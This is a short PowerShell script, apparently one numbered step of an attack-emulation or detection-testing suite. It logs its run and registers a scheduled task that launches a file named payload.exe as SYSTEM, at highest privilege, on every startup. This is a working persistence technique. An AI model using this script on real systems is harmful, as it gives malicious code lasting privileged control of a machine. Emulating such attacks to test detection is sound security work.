$path = "C:\prehendo\Logs\attack4.txt"
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"


$exepath = "C:\prehendo\Tools\Malware\payload.exe"
$action = New-ScheduledTaskAction -Execute $exepath
$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$trigger = New-ScheduledTaskTrigger -AtStartup
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger

Start-Transcript -path $path -append

####################TASK START####################

Register-ScheduledTask "Attack4_ScheduledTask" -InputObject $task -Force

####################TASK END####################

Stop-Transcript